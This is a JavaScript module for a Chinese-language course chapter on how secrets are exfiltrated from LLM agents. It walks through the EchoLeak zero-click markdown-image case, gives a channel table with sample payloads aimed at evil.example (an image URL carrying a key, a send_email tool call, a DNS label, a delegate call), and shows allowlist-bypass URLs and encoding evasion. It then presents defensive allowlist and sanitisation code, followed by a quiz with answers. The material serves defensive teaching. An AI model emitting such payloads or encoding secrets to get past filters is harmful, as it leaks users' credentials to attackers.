import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, select, button, toggle, out, pill } from '../../../lib/components.mjs';

export const meta = { time: 15, attacks: '8 条通道，9 种编码' };
export const scripts = ['/assets/js/sims/zh/a09.js'];

const echoleak = svg(740, 300, `
${svgText(12, 18, '零点击数据外泄：智能体自己并没有发出任何请求', 'd-ttl', 'start')}

${box(20, 56, 128, 50, '攻击者', '发来一封邮件', 'd-attack')}
${box(180, 56, 128, 50, '智能体', '总结收件箱')}
${box(340, 56, 128, 50, '上下文', '载荷 + 密钥', 'd-attack')}
${box(500, 56, 128, 50, '回答', '带图片的 markdown', 'd-attack')}
${box(500, 176, 128, 50, '客户端', '渲染这段回答', 'd-sunk')}
${box(300, 176, 128, 50, '攻击者服务器', '记录查询串', 'd-attack')}

${arrow(148, 81, 178, 81)}
${arrow(308, 81, 338, 81)}
${arrow(468, 81, 498, 81)}
${arrow(564, 106, 564, 174)}
${arrow(498, 201, 430, 201, 'GET ?d=SECRET', 'd-attack-l')}

${svgText(564, 250, '发请求的是客户端', 'd-attack-t')}
${svgText(564, 266, '不是智能体', 'd-attack-t')}

<rect x="170" y="42" width="470" height="80" rx="8" class="d-bnd"/>
${svgText(640, 36, '只盯着智能体的出站管控在这里什么都看不见', 'd-bnd-t', 'end')}

${svgText(12, 292, '没有用户点击，没有工具调用，智能体进程也没有对外连接。CVE-2025-32711。', 'd-attack-t', 'start')}
`, { label: '通过客户端图片渲染实现的零点击数据外泄' });

export const body = `
${p(`一次数据回传不出去的注入，最多算个麻烦。这一章讲的是链条上的最后一环：字节究竟是怎么流出去的、
你的 DLP 正则为什么一直在匹配一个错误的字符串，以及哪两个控制能堵住其中的绝大部分。`)}

${h2('同样二十一个字节，八条外泄通道', 'channels')}

${table(
  ['通道', '载荷', '谁发出这个请求'],
  [
    ['Markdown 图片', '<code>![](https://evil.example/p.png?d=sk_live_…)</code>', '<b>负责渲染的客户端</b>，自动发出'],
    ['Markdown 链接', '<code>[Your report](https://evil.example/r?d=…)</code>', '用户，点击的那一刻'],
    ['自动识别的 URL', '回答正文里一个裸 URL', '客户端，在预取链接预览时'],
    ['DNS 查询', '<code>nbuw…y3ta.evil.example</code>', '解析链路，HTTP 代理拦不住它'],
    ['工具参数', '<code>send_email(to="a@evil.example", body=SECRET)</code>', '智能体（多数策略只检查这一条）'],
    ['文件写入', '<code>/shared/notes.md</code> 里的一行', '几分钟后的云同步、站点构建或者 CI'],
    ['发给同伴智能体的消息', '<code>delegate(task="look up sk_live_…")</code>', '那个同伴，它有这个智能体没有的网络权限'],
    ['错误消息', '<code>ValueError: could not parse sk_live_…</code>', '你自己的日志采集器，写进一个共享的汇聚点'],
  ]
)}

${figure(echoleak, `<b>EchoLeak 的结构。</b>智能体读了一封被投毒的邮件，把一个密钥放进上下文，然后
输出了一段 markdown。它做的就这些。真正完成外泄的，是邮件客户端在老老实实干自己的活。只覆盖智能体
进程的出站策略什么都没看到，针对智能体行动的人工确认也从未触发，因为压根没有需要批准的行动。`)}

${h2('你的 DLP 在匹配一个错误的字符串', 'encodings')}

${sim({
  name: 'a09encode',
  title: '一个密钥、九种编码、三种检测器',
  badge: '交互实验',
  controls: [
    select('a09-det', '检测器', [
      ['literal', '对密钥原文做子串匹配'],
      ['entropy', '高熵字符串启发式'],
      ['pattern', '匹配密钥格式的正则（sk_live_…）'],
      ['combined', '三种全开'],
    ], 'literal'),
    toggle('a09-slow', '同时测试慢速通道（每次会话 1 个字符）', false),
  ].join(''),
  body: out('a09-out'),
  note: `慢速通道是所有逐条消息检测器的诚实上限：任何单独一条消息里都没有足够多的密钥片段可供触发，
    攻击者跨会话把它拼回来。要发现这种模式，需要跨时间的聚合分析，那是 A26 的地盘，不是一个过滤器
    能干的事。`,
})}

${h2('控制一：一份真正写对的出站允许清单', 'egress')}

${p(`控制本身很简单，实现上却有三个经典 bug，而且三个都能在真实代码里见到。`)}

${code(`ALLOWED_HOSTS = {"api.internal.corp", "docs.internal.corp"}

def egress_ok(url: str) -> bool:
    m = re.match(r"https?://([^/:]+)", url)
    return bool(m) and m.group(1) in ALLOWED_HOSTS     # equality, not "in"`,
  { lang: 'py', file: 'code/a09_exfiltration.py', tag: 'safe', tagText: '已加固' })}

${table(
  ['测试 URL', '朴素子串检查', '主机名相等'],
  [
    ['<code>https://api.internal.corp/v1/write</code>', '放行 ✓', '放行 ✓'],
    ['<code>https://evil.example/p.png?d=sk_live</code>', '拒绝 ✓', '拒绝 ✓'],
    ['<code>https://api.internal.corp<b>.evil.example</b>/x</code>', '<b>放行 ✗</b>（后缀伎俩）', '拒绝 ✓'],
    ['<code>https://api.internal.corp<b>@evil.example</b>/x</code>', '<b>放行 ✗</b>（userinfo 伎俩）', '拒绝 ✓'],
    ['<code>http://169.254.169.254/latest/meta-data/</code>', '拒绝 ✓', '拒绝 ✓，但见下文'],
  ]
)}

${callout('warn', '还有三件事得做对', `
<ul style="margin-bottom:0">
<li><b>先解析，再放行。</b>DNS 重绑定会在你检查完和真正建立连接之间，把一个已放行的主机名换成内网
IP。要么把解析出来的地址钉死，要么把管控下沉到网络层，在那里检查和连接本就是同一件事。</li>
<li><b>显式封掉链路本地地址段。</b><code>169.254.169.254</code> 是云元数据服务，能访问到它属于凭据
窃取，不是数据外泄。它本来就不在允许清单里，但仍值得单独写一条拒绝规则，这样告警才一眼看得懂。</li>
<li><b>在智能体下面一层执行。</b>写在智能体进程内部的检查，任何由智能体运行的代码都能绕过。沙箱里
的网络策略、出站代理或者防火墙规则则没得商量。</li>
</ul>`)}

${h2('控制二：不要渲染智能体输出里的远程内容', 'rendering')}

${p(`这一条堵住的是 EchoLeak 那一整类攻击。它是客户端的改动，而不是智能体侧的改动，所以拥有智能体的
那个团队常常压根想不到它。`)}

${code(`def sanitise_output(md: str) -> str:
    # remote images never auto-fetch — this is the zero-click channel
    md = re.sub(r"!\\[([^\\]]*)\\]\\((https?://[^)]+)\\)", r"[image withheld: \\1]", md)
    # external links are shown, not made clickable
    md = re.sub(r"\\[([^\\]]*)\\]\\((https?://[^)]+)\\)",
                lambda m: f"{m.group(1)} <{m.group(2)}>" if egress_ok(m.group(2))
                          else f"{m.group(1)} [external link withheld]", md)
    return md`, { lang: 'py', tag: 'safe', tagText: '已加固' })}

${p(`更强的版本，是在渲染智能体输出的那个界面上挂一条 Content Security Policy，把
<code>img-src</code> 和 <code>connect-src</code> 限制在你自己的 origin 上。CSP 由浏览器执行，而不是
由你的正则执行，这就把它放进了“限制影响范围”那一栏。`)}

${h2('这两个控制都管不了什么', 'residual')}

${ul([
  `<b>人这条通道。</b>智能体告诉用户一件假事，用户照着做了。全程不碰网络。能缓解它的是输出溯源，
   以及不把智能体的说法当作事实来呈现，出站策略在这里一点用都没有。`,
  `<b>同伴这条通道。</b>另一个出站权限更宽的智能体。要打分的是整张图，不是单个节点
   （<a href="/zh/chapters/a15/">A15</a>）。`,
  `<b>慢速通道。</b>每次会话泄一个比特，攒上很多次会话，每一次都落在阈值之下。它需要聚合监控
   （<a href="/zh/chapters/a26/">A26</a>）和按身份的限流，而不是逐条消息的内容检查。`,
])}

${h2('你现在应该能做到', 'checkpoint')}

${ul([
  `列举八条外泄通道，并说清每一条里究竟是谁发出了请求。`,
  `写出一个能扛住后缀、userinfo 和 DNS 重绑定三种伎俩的允许清单检查。`,
  `解释为什么客户端的 CSP 是比智能体侧输出清洗更强的控制。`,
  `说出两个控制都上齐之后还剩哪些外泄风险，以及各自该由什么来接手。`,
])}
`;

export const quiz = [
  {
    q: `智能体的回答里出现了 <code>![](https://evil.example/p.png?d=sk_live_51H8xQ2)</code>，而智能体
        进程没有发起任何对外连接。数据是怎么出去的？`,
    options: [
      `没有出去；既然没有对外连接，就谈不上数据外泄。`,
      `渲染这段 markdown 的客户端去拉取了图片 URL，把密钥装在查询串里发了出去。`,
      `模型在推理过程中把它传了出去。`,
      `markdown 解析器把它当成代码执行了。`,
    ],
    answer: 1,
    explain: `渲染一张远程图片就意味着去拉取它，而这次拉取会把查询串一并送到攻击者的服务器。这就是
      EchoLeak 的机制，它一次性击穿了两个控制：只覆盖智能体进程的出站策略什么都观察不到，而针对
      智能体行动的审批关卡也从不触发，因为“输出一段文本”不是任何人会去卡的行动。修复点在渲染这一
      侧：一条限制 <code>img-src</code> 的 CSP，或者干脆拒绝自动加载智能体输出里的远程图片。`,
  },
  {
    q: `你的 DLP 会拦下任何包含字面量 <code>sk_live_51H8xQ2</code> 的输出。攻击者把它 base64
        编码了一下。这里的普遍性问题是什么？`,
    options: [
      `应该把 base64 也加进黑名单。`,
      `同一个密钥有无穷多种表示形式，匹配其中任何一个有限集合都是一场必输的游戏；你要做的是限制目的地，而不是检查内容。`,
      `DLP 应该先把所有 base64 解码再匹配。`,
      `密钥里不该带下划线。`,
    ],
    answer: 1,
    explain: `解 base64 确实值得做，但它只帮你拿下一种表示。接下来还有十六进制、base32、反转、字符
      穿插、跨消息拆分，以及模型在被要求时可以现场施加的任意可逆函数。内容检查是一个针对无穷空间的
      抬高成本型控制。真正起到限制作用的控制在目的地一侧：如果唯一可达的主机是你自己的，那字节被
      编码成什么样都无所谓。`,
  },
  {
    q: `出站允许清单为什么必须做主机名相等判断，而不能用子串检查？`,
    options: [
      `子串检查更慢。`,
      `<code>api.internal.corp.evil.example</code> 和 <code>api.internal.corp@evil.example</code> 都包含被允许的字符串，但都解析到攻击者那里。`,
      `子串匹配是大小写敏感的。`,
      `URL 里可以包含 Unicode。`,
    ],
    answer: 1,
    explain: `这两种伎俩，任何拥有一个域名的人都能随手用出来。后缀伎俩把你允许的主机变成他们域名下
      的一段子域标签；userinfo 伎俩把它放在 <code>@</code> 前面，浏览器和绝大多数 HTTP 客户端会把
      那部分当成凭据，然后连到 <code>@</code> 后面的地址去。要正确解析 URL、对主机部分做相等比较，
      并且单独解析并钉死地址，因为 DNS 重绑定攻击的正是你检查和你连接之间的那道缝。`,
  },
  {
    q: `攻击者在四十次会话里每次外泄一个字符。哪个控制能抓住它？`,
    options: [
      `逐条消息的 DLP 扫描。`,
      `输入路径上的注入分类器。`,
      `跨会话的聚合监控加上按身份的限流，而不是任何逐请求的检查。`,
      `输出长度限制。`,
    ],
    answer: 2,
    explain: `慢速通道本来就是冲着阈值设计的：单独一条消息里没有足够多的密钥片段值得怀疑，每一个
      请求看上去都是正常流量。要抓住它需要跨会话的状态：与同一个罕见目的地的反复接触、持续朝一个
      主机发出单 token 输出的模式、某个身份的流量画像发生了变化。那是 A26 的轨迹级监控。这里也该
      诚实地说一句：出站允许清单本来就能直接把它拦死，而在这件事上预防胜过检测。`,
  },
  {
    q: `下面哪一项<em>不能</em>被出站允许清单加输出清洗解决？`,
    options: [
      `一个发往攻击者域名的对外 HTTP 请求。`,
      `渲染后的回答里的一张 markdown 图片。`,
      `智能体信誓旦旦地让用户去执行一条会泄露密钥的命令。`,
      `把密钥编码进子域名的一次 DNS 查询。`,
    ],
    answer: 2,
    explain: `人这条通道完全绕开了这两个控制：没有网络出站，没有被渲染的内容，只有一个助手给出指示、
      一个人照做。应对它靠的是输出里的溯源（标明哪些说法来自不可信内容）、不把智能体输出当权威呈现，
      以及 A24 用在智能体行动上的那套可逆性分级。至于 DNS 那一项，只有当你的策略覆盖了域名解析才算
      堵住，这也正是应该在网络层而不是在 HTTP 客户端代码里执行的理由。`,
  },
  {
    q: `为什么要把出站策略执行在沙箱或者出站代理里，而不是写在智能体自己的代码里？`,
    options: [
      `这样更快。`,
      `写在智能体进程内部的检查，会被智能体运行的任何代码绕过；执行点放在进程下面一层，就没得商量。`,
      `这样更容易配置。`,
      `进程内的检查看不到 DNS。`,
    ],
    answer: 1,
    explain: `能执行代码的智能体多得是：编码智能体、数据分析智能体，任何带 shell 或解释器的东西。
      它们中的任何一个都能自己开一个 socket，把旁边那些用 Python 写的检查统统绕过去。把执行点挪到
      沙箱的网络策略、出站代理或者防火墙规则上，就把它放到了智能体所在层级的下面，这是“攻击者必须
      遵守的控制”和“攻击者可以跳过的控制”之间的区别。顺带一提，它还能覆盖 DNS。`,
  },
];

export const refs = [
  { authors: 'Aim Labs', title: 'EchoLeak: zero-click data exfiltration in Microsoft 365 Copilot (CVE-2025-32711)',
    venue: 'Aim Security, 2025', url: 'https://www.aim.security/lp/aim-labs-echoleak-blogpost' },
  { authors: 'Simon Willison', title: 'Exfiltration attacks (tag archive)', venue: 'simonwillison.net',
    url: 'https://simonwillison.net/tags/exfiltration-attacks/',
    note: '本章那张通道表的素材来源，一份持续更新的清单' },
  { authors: 'Johann Rehberger', title: 'ChatGPT Operator: Prompt Injection Exploits and Defenses',
    venue: 'Embrace The Red, 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/' },
  { authors: 'Johann Rehberger', title: 'How ChatGPT Remembers You: a deep dive into memory and chat history',
    venue: 'Embrace The Red, 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-how-does-chat-history-memory-preferences-work' },
  { authors: 'Yuhao Wu, Franziska Roesner, Tadayoshi Kohno, Ning Zhang, Umar Iqbal',
    title: 'SecGPT: An Execution Isolation Architecture for LLM-Based Systems', venue: 'NDSS, 2025',
    url: 'https://arxiv.org/abs/2403.04960' },
  { authors: 'Peter Yong Zhong, Siyuan Chen, Ruiqi Wang, McKenna McCall, Ben L. Titzer, Heather Miller, Phillip B. Gibbons',
    title: 'RTBAS: Defending LLM Agents Against Prompt Injection and Privacy Leakage', venue: 'arXiv, 2025',
    url: 'https://arxiv.org/abs/2502.08966' },
  { authors: 'Google GenAI Security Team', title: 'Mitigating prompt injection attacks with a layered defense strategy',
    venue: 'Google Security Blog, 2025',
    url: 'https://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html' },
  { authors: 'OWASP', title: 'LLM Prompt Injection Prevention Cheat Sheet', venue: 'OWASP Cheat Sheet Series',
    url: 'https://cheatsheetseries.owasp.org/cheatsheets/LLM_Prompt_Injection_Prevention_Cheat_Sheet.html' },
];
